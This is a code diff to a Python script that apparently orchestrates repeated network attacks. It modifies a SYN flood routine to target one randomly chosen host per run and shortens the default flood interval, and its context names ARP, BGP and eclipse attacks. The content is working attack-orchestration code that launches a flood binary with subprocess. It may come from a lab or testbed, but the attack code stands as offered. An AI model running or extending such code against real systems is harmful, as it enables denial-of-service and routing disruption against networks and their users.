@@ -155,35 +155,35 @@ _shutdown = threading.Event()
 # SYN FLOOD
 # ──────────────────────────────────────────────
 def synflood_once(duration):
-    """Flood every target in parallel for `duration` seconds, then stop."""
+    """Flood a single randomly-chosen target for `duration` seconds, then stop."""
+
     if not os.path.exists(SYNFLOOD_BIN):
         log("synflood", f"binary not found at {SYNFLOOD_BIN} — skipping", RED)
         return
 
-    log("synflood", f"flooding {len(SYNFLOOD_TARGETS)} targets for {duration}s", CYAN)
-    procs = []
-    for ip, port in SYNFLOOD_TARGETS:
-        try:
-            procs.append(subprocess.Popen(
-                [SYNFLOOD_BIN, ip, str(port)],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-            ))
-        except Exception as e:
-            log("synflood", f"could not start {ip}:{port}: {e}", YELLOW)
-    log("synflood", f"{len(procs)} flood processes running", GREEN)
+    import random
+    ip, port = random.choice(SYNFLOOD_TARGETS)
+    log("synflood", f"flooding {ip}:{port} for {duration}s", CYAN)
 
-    # Run for the duration (interruptible), then tear everything down.
+    try:
+        proc = subprocess.Popen(
+            [SYNFLOOD_BIN, ip, str(port)],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+    except Exception as e:
+        log("synflood", f"could not start {ip}:{port}: {e}", YELLOW)
+        return
+
+    log("synflood", f"flood process running (pid {proc.pid})", GREEN)
     _shutdown.wait(timeout=duration)
-    for p in procs:
-        if p.poll() is None:
-            p.terminate()
+
+    if proc.poll() is None:
+        proc.terminate()
     time.sleep(1)
-    for p in procs:
-        if p.poll() is None:
-            p.kill()
-    log("synflood", "flood stopped", GREEN)
+    if proc.poll() is None:
+        proc.kill()
 
-
+    log("synflood", f"flood stopped ({ip}:{port})", GREEN)
 # ──────────────────────────────────────────────
 # ECLIPSE ATTACKS (delegate to the existing scripts)
 # ──────────────────────────────────────────────
@@ -257,10 +257,10 @@ def main():
                         help="Seconds between ARP runs (default 10)")
     parser.add_argument("--bgp-interval", type=int, default=10,
                         help="Seconds between BGP runs (default 10)")
-    parser.add_argument("--synflood-interval", type=int, default=60,
-                        help="Seconds between SYN flood runs (default 60)")
-    parser.add_argument("--synflood-duration", type=int, default=0.1,
-                        help="Seconds to SYN flood per run (default 0.1)")
+    parser.add_argument("--synflood-interval", type=int, default=30,
+                        help="Seconds between SYN flood runs (default 30)")
+    parser.add_argument("--synflood-duration", type=int, default=0.5,
+                        help="Seconds to SYN flood per run (default 0.5)")
 
     parser.add_argument("--cycles", type=int, default=0,
                         help="Max runs per attack; 0 = forever (default 0)")
